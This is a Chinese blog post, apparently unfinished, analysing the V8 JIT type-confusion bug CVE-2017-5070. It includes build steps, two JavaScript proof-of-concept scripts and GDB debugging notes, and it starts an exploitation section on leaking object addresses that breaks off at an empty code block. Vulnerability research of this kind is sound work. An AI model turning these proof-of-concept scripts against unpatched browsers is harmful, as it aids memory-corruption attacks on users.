---
layout:     post
title:      "V8引擎CVE-2017-5070漏洞分析（工事中）"
subtitle:   ""
date:       2019-08-02 10:30:00
author:     "GToad"
header-img: "img/android-five.png"
catalog: true
tags:
    - chrome
    - v8
    - exploit
    - cve
    - browser
---

> 本文为本博客V8系列第三篇。

## 漏洞基本信息

[漏洞信息页面](https://bugs.chromium.org/p/chromium/issues/detail?id=722756)
[漏洞修复代码](https://chromium.googlesource.com/v8/v8.git/+/e33fd30777f99a0d6e16b16d096a2663b1031457)

根据漏洞基本信息可准备分析环境，先切换至漏洞修复前版本。
```
git checkout 9a493631005539cdabb7366352e8dd8188141a80
gclient sync
```

对源码进行编译。
```
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8
```

## PoC

以下代码执行后V8引擎会直接崩溃。

```javascript
var array = [[{}], [1.1]];

function transition() {
  for(var i = 0; i < array.length; i++){
    var arr = array[i];
    arr[0] = {};
  }
}

var double_arr2 = [1.1,2.2];

var flag = 0;
function swap() {
  try {} catch(e) {}  // Prevent Crankshaft from inlining this.
  if (flag == 1) {
    array[1] = double_arr2;
  }
}

var expected = 6.176516726456e-312;
function f(){
  swap();
  double_arr2[0] = 1;
  transition();
  double_arr2[1] = expected;
}

// %OptimizeFunctionOnNextCall(f);
for(var i = 0; i < 0x10000; i++) {
  f();
}
flag = 1;
f();
assertEquals(expected, double_arr2[1]);
```

![]()

从PoC来看，应该是f()、swap()和transition()三个函数在0x10000次循环执行后产生了Bug。毫无疑问，又是一个V8在对函数进行JIT优化后由于去除“冗余”类型检查而产生的问题。

## 漏洞成因

#### 调试分析

本漏洞的PoC在调试时可能存在一些问题，直接按照之前文章中的方法对PoC进行调试时可能出现数据无法正常读出的情况，因此，需要使用GDB的attach功能进行多进程间的调试。方法如下：
1. 在一个terminal中运行测试脚本：`gdb d8 --allow-natives-syntax ./test.js`，脚本中原本用于下断点的`%SystemBreak()`全部替换成`readline()`，这样脚本会停在`readline()`这里等用户输入并回车。
2. 在另一个terminal里用`ps -uf`命令查看步骤1中的进程号，然后用`sudo gdb d8`，进入后用attach功能指定目标进程号来调试这个进程，attach上以后记得先用`stop`命令让进程暂停下来。

此外，这次编译出来的d8版本似乎并不支持job命令，应该是debug_print_object相关函数没有导出，可以修改编译参数来解决。不过问题不大，直接看raw数据也行，不过对于函数的JIT机器码查看时会比较麻烦，不会像job指令那样直接给出其中的汇编代码。不过可以从属性值中找到机器码的地址，然后使用GDB的`disassemble`命令进行查看。

#### 结果分析
本漏洞的原理为近期JS引擎漏洞中最复杂的一个，先看两个版本POC,第一个是网上的，代码在下方；第二个是原作者[大宝]()的，上面已经给出了。可能我们编译后的d8运行第一个会效果明显一些，在倒数第二行报错，即对double_arr2的解析会报错。

```javascript
var array = [[{}], [1.1]];
var double_arr2 = [1.1,2.2];
function transition() {
  for(var i = 0; i < array.length; i++){
    var arr = array[i];
    arr[0] = {};
  }

}

var flag = 0;
function swap() {
  try {} catch(e) {}  // Prevent Crankshaft from inlining this.
  if (flag == 1) {
    array[1] = double_arr2;
  }
}
var expected = 6.176516726456e-312;
function f(){
  Math.sin(1);
  swap();  
  double_arr2[0] = 1;
  transition(); 
  double_arr2[1] = expected; 
  
}
%DebugPrint(double_arr2);
f();
%OptimizeFunctionOnNextCall(f);
flag = 1;
f();

print ("111");
print (expected === double_arr2[1]);
print ("222")
```

那么仔细看一下本漏洞的大致原理是什么呢？关键在于transition和swap这两个函数。

swap函数不仅仅是需要JIT优化，还要防止自己因为过短而被inline进f()。

transition这个函数看似没有对我们的array和double_arr2进行任何改变，仅仅只修改了局部变量arr。但是，这只是代码表面现象，实际上v8会对array中的两个元素进行优化调整。并且这个优化调整还会在flag=1时在swap中涉及到double_arr。

最后由于执行次数太多，swap和transition会进行JIT优化并去除一些类型检查。最终的效果就是double_arr2在访问时会直接把自己的元素上保存的数据当作double值给直接返回出来，而不是正常情况下把它们作为double对象的指针去寻找目标内存中下一个的数据作为double来返回。

因此，这个漏洞最后的表现为：double_arr2直接把自己元素的指针当作double来返回了。

## 漏洞利用

#### 泄露地址

由于double_arr2开始直接把自己元素的指针当作double来返回了，所以在f()里直接对double_arr2进行object赋值，这样访问double_arr后就能直接得到object的地址了。于是这就是个任意地址读的原语addrOf（object），这里并没有暴露出很明显的fakeObject原语。

```javascript

```

